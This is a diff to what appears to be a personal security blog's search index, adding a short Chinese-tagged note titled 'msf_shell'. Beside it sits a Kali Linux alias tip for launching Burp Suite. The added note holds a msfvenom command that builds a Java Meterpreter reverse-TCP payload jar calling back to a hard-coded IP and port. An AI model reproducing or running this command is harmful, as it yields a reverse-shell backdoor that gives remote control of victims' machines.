@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[msf_shell]]></title>
+    <url>%2F2018%2F01%2F18%2Fmsf-shell%2F</url>
+    <content type="text"><![CDATA[windows/meterpreter/reverse_tcp msfvenom -p java/meterpreter/reverse_tcp LHOST=203.101.160.157 LPORT=8808 -f jar -o msfserver.jar]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>msf</tag>
+        <tag>shell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[linux实用技巧]]></title>
     <url>%2F2018%2F01%2F18%2Flinux%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7%2F</url>
     <content type="text"><![CDATA[编辑 .bashrc 文件： root@kali:~# vim .bashrc root@kali:~# source .bashrc 自定义终端命令启动程序exm： alias burp=&apos;setsid java -jar /root/softs/burpsuite_pro_v1.6.37.jar &gt;/dev/null 2&gt;&amp;1 &amp;&apos;]]></content>
